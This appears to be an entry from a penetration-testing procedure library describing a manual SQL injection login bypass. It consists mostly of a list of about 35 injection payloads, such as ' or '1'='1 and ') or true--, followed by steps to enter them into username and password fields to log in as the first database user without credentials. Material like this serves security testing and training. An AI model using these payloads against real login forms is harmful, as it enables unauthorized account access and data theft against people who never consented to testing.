---
id: c3f11bc0-1722-479c-903d-a7a054b232f6
name: Login Bypass SQL Injection - Manual Method
type: procedure
verified: true
submitted: true
created_at: '2020-07-21T15:34:42.728844+00:00'
updated_at: '2023-05-26T01:28:36.819187+00:00'
platforms:
- Web
tags:
- '[[injection]]'
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[SQL]]'
- '[[sqli]]'
- '[[Web Applications]]'
---

# Login Bypass SQL Injection - Manual Method

**Status**: ✓ Verified

## Summary

SQL injection can be used to bypass authentication mechanism in an application. The injected payload will evaluate the SQL statement to True, allowing the attacker to login into the application without any credentials. Following similar SQL injection payloads can be used to bypass login. ' or '1'='

## Description

# Description

SQL injection can be used to bypass authentication mechanism in an application. The injected payload will evaluate the SQL statement to True, allowing the attacker to login into the application without any credentials. Following similar SQL injection payloads can be used to bypass login.

*' or '1'='1*

*')-'*

*' '*

*'&'*

*'^'*

*'*'*

*' or ''-'*

*' or '' '*

*' or ''&'*

*' or ''^'*

*' or ''*'*

*"-"*

*" "*

*"&"*

*"^"*

*"*"*

*" or ""-"*

*" or "" "*

*" or ""&"*

*" or ""^"*

*" or ""*"*

*or true--*

*" or true--*

*' or true--*

*") or true--*

*') or true--*

*' or 'x'='x*

*') or ('x')=('x*

*')) or (('x'))=(('x*

*" or "x"="x*

*") or ("x")=("x*

*")) or (("x"))=(("x*

# Instructions

1. Inject the payload *' or '1'='1 *into the username and password fields

2. Payload is accepted by the application and the attacker is logged in as the first user in the database.

Note: If the payload doesn't work, try using the other payloads listed above or construct something similar that matches the application

## Platforms

- Web

## Tags

- [[injection]]
- [[owasp]]
- [[owasp top 10]]
- [[SQL]]
- [[sqli]]
- [[Web Applications]]
